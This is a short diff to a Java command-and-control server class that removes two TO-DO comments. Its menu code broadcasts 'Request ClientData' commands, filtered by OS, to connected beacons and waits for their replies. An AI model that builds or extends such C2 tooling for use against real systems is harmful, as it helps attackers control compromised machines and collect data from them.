@@ -478,14 +478,12 @@ public class C2ServerUserHandler implements Runnable{
                 userInput = userInputScanner.nextLine();
                 if(userInput.equals("1")){
                     String OS = "Windows";
-                    // TO DO figure out how to send request to beacon server
                     C2server.broadcastToBeacons("Request ClientData "+ OS +" All_ ");
                     try {
                         waitForResponse();
                     } catch (InterruptedException e) {e.printStackTrace();}
                 } else if (userInput.equals("2")){
                     String OS = "Linux";
-                    // TO DO figure out how to send request to beacon server
                     C2server.broadcastToBeacons("Request ClientData "+ OS +" All_ ");
                     try {
                         waitForResponse();
